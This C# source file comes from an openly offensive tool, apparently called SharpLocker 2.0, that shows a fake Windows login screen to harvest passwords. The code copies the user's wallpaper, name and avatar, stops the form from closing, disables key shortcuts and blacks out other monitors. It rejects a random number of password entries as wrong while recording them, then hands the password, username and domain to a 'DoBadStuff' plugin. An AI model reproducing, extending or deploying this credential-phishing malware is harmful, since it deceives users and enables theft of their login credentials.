using SharpLocker_2._0.Classes;
using SharpLocker_2._0.Controls;
using SharpLocker_2._0.Interfaces;
using System;
using System.Collections.Generic;
using System.Data;
using System.DirectoryServices.AccountManagement;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SharpLocker_2._0
{
    public partial class WindowsLogin : Form
    {
        #region "Variables and Stuff"

        // Decides wether the form can be closed or not
        private bool DenyClose { get; set; }
        private IDoBadStuff DoBadStuff;
        private Configuration Configuration { get; set; } = new Configuration();

        private int PasswordErrors { get; set; }
        private int PasswordErrorCounter { get; set; }
        private List<string> ErrorPasswords { get; set; } = new List<string>();

        #endregion

        public WindowsLogin()
        {
            InitializeComponent();
            Initialize();
        }

        #region "Lock"

        // Gets called when main login form would be closing
        private void WindowsLogin_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (!Configuration.DebugMode) e.Cancel = DenyClose;
        }

        protected override CreateParams CreateParams
        {
            get
            {
                var parms = base.CreateParams;
                parms.Style &= ~0x02000000;
                parms.ExStyle |= 0x02000000;
                return parms;
            }
        }

        #endregion

        // Gets called when the Login Button is clicked or the enter key event is triggered on the password text box
        private void LoginButton_Click(object sender, EventArgs e)
        {
            // Do nothing if no password has been entered
            if (string.IsNullOrEmpty(PasswordTextBox.Text)) return;
            if (PasswordTextBox.Text == Configuration.PlaceholderText) return;

            if (PasswordErrorCounter < PasswordErrors)
            {
                PasswordErrorCounter++;
                ErrorPasswords.Add(PasswordTextBox.Text);
                ShowPasswordError();
                return;
            }

            DenyClose = false;

            if (!Configuration.DebugMode) KeyPressHandler.Enable();

            try
            {
                // Time for malicious business 😏
                DoBadStuff.Now(PasswordTextBox.Text, Environment.UserName, Environment.UserDomainName, ErrorPasswords);
            }
            catch (Exception ex)
            {
                if (Configuration.DebugMode) MessageBox.Show(ex.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            finally
            {
                Close();
            }

        }

        private void ShowPasswordError()
        {
            SetPlaceholder();
            ChangeVisiblityOfPasswordControls(true);
        }

        private void WrongPasswordButton_Click(object sender, EventArgs e)
        {
            ChangeVisiblityOfPasswordControls(false);
        }

        private void ChangeVisiblityOfPasswordControls(bool wrongPassword)
        {
            PasswordTextBox.Visible = !wrongPassword;
            ShowPasswordButton.Visible = !wrongPassword;
            LoginButton.Visible = !wrongPassword;
            CapsLockLabel.Visible = !wrongPassword;

            WrongPasswordLabel.Visible = wrongPassword;
            WrongPasswordButton.Visible = wrongPassword;
        }

        #region "Password"

        // Show password when button is pressed
        private void ShowPasswordButton_Click(object sender, EventArgs e)
        {
            if (PasswordTextBox.Text != Configuration.PlaceholderText)
                PasswordTextBox.UseSystemPasswordChar = !PasswordTextBox.UseSystemPasswordChar;
        }

        private void PasswordTextBox_KeyDown(object sender, KeyEventArgs e)
        {
            // Show caps lock warning
            CapsLockLabel.Visible = IsKeyLocked(Keys.CapsLock);

            // send password
            if (e.KeyCode == Keys.Enter) LoginButton.PerformClick();

            // WinForms doesn't have *real* placeholders, so we have to tinker around
            // to make it seem like a real placeholder.
            // this prevents moving the text cursor
            if (PasswordTextBox.Text == Configuration.PlaceholderText)
            {
                if (e.KeyCode == Keys.Right || e.KeyCode == Keys.Left)
                {
                    PasswordTextBox.Select(0, 0);
                    e.Handled = true;
                }
            }
        }

        // decide wether to show the placeholder or not
        private void PasswordTextBox_TextChanged(object sender, EventArgs e)
        {
            TextBox tb = (TextBox)sender;

            if (string.IsNullOrEmpty(tb.Text))
            {
                SetPlaceholder();
            }

            if (tb.Text.Substring(1, tb.Text.Length - 1) == Configuration.PlaceholderText)
            {
                tb.UseSystemPasswordChar = true;
                tb.Font = new Font("Microsoft Sans Serif", 23.25f);
                tb.Text = tb.Text.Substring(0, 1);
                tb.ForeColor = Color.Black;
                tb.Select(1, 0);
            }
        }

        // WinForms doesn't have *real* placeholders, so we have to tinker around
        // to make it seem like a real placeholder.
        // this prevents placing the text cursor somewhere where it shouldn't be
        private void PasswordTextBox_Click(object sender, EventArgs e)
        {
            if (PasswordTextBox.Text == Configuration.PlaceholderText) PasswordTextBox.Select(0, 0);
        }

        // Put placeholder text into password textbox
        private void SetPlaceholder()
        {
            PasswordTextBox.UseSystemPasswordChar = false;
            PasswordTextBox.Text = Configuration.PlaceholderText;
            PasswordTextBox.Font = new Font("Microsoft Tai Le", 21.00f);
            PasswordTextBox.ForeColor = SystemColors.ControlLight;
            PasswordTextBox.Select(0, 0);
        }

        #endregion

        #region "Init"

        private void WindowsLogin_Load(object sender, EventArgs e)
        {
            // Blur background image after everything has been loaded
            BlurBackground();
            PasswordTextBox.Focus();
        }

        // Handle all setup
        private void Initialize()
        {
            InitializeConfiguration();
            InitializeMisc();
            InitializePasswordTextbox();
            InitializeKeyCombinations();
            InitializeUserLabel();
            InitializeUserIcon();
            InitializeBackground();
            InitializeBadStuff();
            InitializeOtherScreens();
            InitializeOtherUsers();
            InitializePasswordErrors();
        }

        // Loads a setup from a dll file thats implements the ISetup interface
        private void InitializeConfiguration()
        {

            try
            {
                ISetup setup = InterfaceLoader.Get<ISetup>();
                if (setup is null) return;

                Configuration = setup.Initialize(Configuration);
            }
            catch (Exception ex)
            {
                Configuration = new Configuration();
                MessageBox.Show(ex.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

        }

        private void InitializeMisc()
        {
            // disallow closing of the program
            DenyClose = true;
            // display CapsLock notification if necessary
            CapsLockLabel.Visible = IsKeyLocked(Keys.CapsLock);

            TopMost = !Configuration.DebugMode;
        }

        // Show placeholder on startup
        private void InitializePasswordTextbox()
        {
            SetPlaceholder();
        }

        // Check wether a .dll file implementing IDoBadStuff is available
        // if its available, it replaces the default bad stuff object
        private void InitializeBadStuff()
        {
            try
            {
                DoBadStuff = InterfaceLoader.Get<IDoBadStuff>();

                if (DoBadStuff is null) DoBadStuff = new DefaultBadStuff();
            }
            catch (Exception ex)
            {
                DoBadStuff = new DefaultBadStuff();
                if (Configuration.DebugMode) MessageBox.Show(ex.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

        }

        // disables certain key combinations in release builds
        private void InitializeKeyCombinations()
        {
            if (!Configuration.DebugMode) KeyPressHandler.Disable();
        }

        // Display the users Username on the form
        private void InitializeUserLabel()
        {
            try
            {
                UserNameLabel.Text = UserPrincipal.Current.DisplayName;
            }
            catch
            {
                UserNameLabel.Text = Environment.UserName;
            }
        }

        // Load the users wallpaper
        private Bitmap GetBackgroundImage() => new Bitmap(@Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Microsoft\\Windows\\Themes\\TranscodedWallpaper"));

        // Set the users wallpaper as the form background
        private void InitializeBackground()
        {
            BackgroundImage = GetBackgroundImage();
        }
        // blur the users wallpaper and set it as the form background
        private void BlurBackground()
        {
            GaussianBlur blur = new GaussianBlur(GetBackgroundImage());
            BackgroundImage = blur.Process(10);

            if (BackgroundImage.IsPixelBright(11, 387) || //Bottom left
                BackgroundImage.IsPixelBright(EaseOfAccessButton.Location.X, EaseOfAccessButton.Location.Y) ||
                BackgroundImage.IsPixelBright(UserNameLabel.Location.X, UserNameLabel.Location.Y)) BackgroundImage.AdjustBrightness(-80);
        }

        // Load the current users profile picture into the form
        private void InitializeUserIcon()
        {
            SetUserIconByName(Environment.UserName, UserIconPictureBox);
        }

        // Get a users profile picture from a directory
        private Image GetUserIconFromPath(string fileEnding, string path)
        {
            try
            {
                foreach (string f in Directory.GetFiles(path))
                {
                    if (!f.EndsWith($".{fileEnding}")) continue;
                    if (!Path.GetFileName(f).Contains(Environment.UserName)) continue;
                    return Image.FromFile(f);
                }

                return null;
            }
            catch
            {
                return Properties.Resources.defaultAvatar;
            }
        }

        // Load the users avatar by knowing his user name
        private void SetUserIconByName(string username, PictureBox pb)
        {
            Image img = null;

            string path = Path.GetTempPath();

            // if no username is given or "other user" is selected (think domain account), load default avatar
            if (string.IsNullOrEmpty(username) || username == "Other User")
                img = Properties.Resources.defaultAvatar;

            // Check for user avatar with multiple file extensions
            if (img is null)
                img = GetUserIconFromPath("bmp", path);

            if (img is null)
                img = GetUserIconFromPath("png", path);

            if (img is null)
                img = GetUserIconFromPath("jpg", path);

            if (img is null)
                img = Properties.Resources.defaultAvatar;


            // resize image and make it a circle
            pb.Image = img.ResizeImage(pb.Width, pb.Height);
        }

        // black out all non-primary screens
        private void InitializeOtherScreens()
        {
            if (!Configuration.DebugMode)
            {
                foreach (Screen screen in Screen.AllScreens.Where(x => !x.Primary))
                {
                    new Task(() => BlackScreen(screen)).Start();
                }
            }
        }

        // Create a fullscreen black form
        private void BlackScreen(Screen screen)
        {
            Form blackForm = new Form()
            {
                Location = new Point(screen.WorkingArea.Left, screen.WorkingArea.Top),
                WindowState = FormWindowState.Maximized,
                StartPosition = FormStartPosition.Manual,
                FormBorderStyle = FormBorderStyle.None,
                BackColor = Color.Black,
                TopMost = true
            };

            blackForm.FormClosing += WindowsLogin_FormClosing;

            blackForm.ShowDialog();
        }

        // draw a white border around the password text box
        private void WindowsLogin_Paint(object sender, PaintEventArgs e)
        {
            int offset = 1; //TODO: hide borders
            e.Graphics.DrawRectangle(new Pen(LoginButton.FlatAppearance.BorderColor), new Rectangle(
                PasswordTextBox.Location.X - offset,
                PasswordTextBox.Location.Y - offset,
                PasswordTextBox.Width + offset,
                PasswordTextBox.Height + offset));
        }

        // add other users buttons and display them in the lower left corner
        private void InitializeOtherUsers()
        {
            AddChangeUserPanel("Other User", 0);
            AddChangeUserPanel(UserNameLabel.Text, 1);
        }

        // create a "other user" control with given properties, then place it on screen
        private void AddChangeUserPanel(string user, int panelCount)
        {
            int panelX = 30;
            int panelY = 380;
            int panelWidth = 200;
            int panelHeight = 50;

            int pictureBoxOffset = 8;
            int pictureBoxX = pictureBoxOffset;
            int pictureBoxHeight = (int)(panelHeight * 0.9);
            int pictureBoxY = (int)((panelHeight - pictureBoxHeight) * 0.58);
            int pictureBoxWidth = pictureBoxHeight;

            int buttonX = pictureBoxWidth + pictureBoxOffset;
            int buttonY = 0;
            int buttonWidth = panelWidth - pictureBoxWidth;
            int buttonHeight = panelHeight;

            Panel p = new Panel()
            {
                Anchor = AnchorStyles.Left | AnchorStyles.Bottom,
                Location = new Point(panelX, panelY + panelHeight * panelCount * -1),
                Size = new Size(panelWidth, panelHeight),
                BorderStyle = BorderStyle.None,
                BackColor = Color.Transparent,
                BackgroundImageLayout = ImageLayout.Stretch,
                TabStop = false
            };

            if (!(user is null) && user == UserNameLabel.Text) p.BackgroundImage = Properties.Resources.defaultButtonBackground;

            p.MouseEnter += (s, e) =>
            {
                p.BackColor = Color.LightGray;
            };

            p.MouseLeave += (s, e) =>
            {
                p.BackColor = Color.Transparent;
            };

            RoundPictureBox pb = new RoundPictureBox()
            {
                BackColor = Color.Transparent,
                Anchor = AnchorStyles.Left | AnchorStyles.Bottom,
                BackgroundImageLayout = ImageLayout.Stretch,
                Size = new Size(pictureBoxWidth, pictureBoxHeight),
                Location = new Point(pictureBoxX, pictureBoxY),
                TabStop = false
            };

            pb.MouseEnter += (s, e) =>
            {
                p.BackColor = Color.LightGray;
            };

            pb.MouseLeave += (s, e) =>
            {
                p.BackColor = Color.Transparent;
            };

            Button b = new Button()
            {
                Anchor = AnchorStyles.Left | AnchorStyles.Bottom,
                Size = new Size(buttonWidth, buttonHeight),
                Location = new Point(buttonX, buttonY),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.Transparent,
                Font = new Font("Segoe UI", 13),
                ForeColor = Color.White,
                Text = user,
                TextAlign = ContentAlignment.MiddleLeft,
                TabStop = false
            };

            b.MouseEnter += (s, e) =>
            {
                p.BackColor = Color.LightGray;
            };

            b.MouseLeave += (s, e) =>
            {
                p.BackColor = Color.Transparent;
            };

            b.FlatAppearance.BorderSize = 0;
            b.FlatAppearance.MouseOverBackColor = Color.Transparent;
            b.FlatAppearance.MouseDownBackColor = Color.Transparent;

            SetUserIconByName(user, pb);

            p.Controls.Add(pb);
            p.Controls.Add(b);
            Controls.Add(p);
        }

        // sets the amount of needed password tries
        private void InitializePasswordErrors()
        {
            PasswordErrors = new Random().Next(Configuration.MinPasswordErrors, Configuration.MaxPasswordErrors + 1);
            PasswordErrorCounter = 0;
        }

    }

    #endregion

}
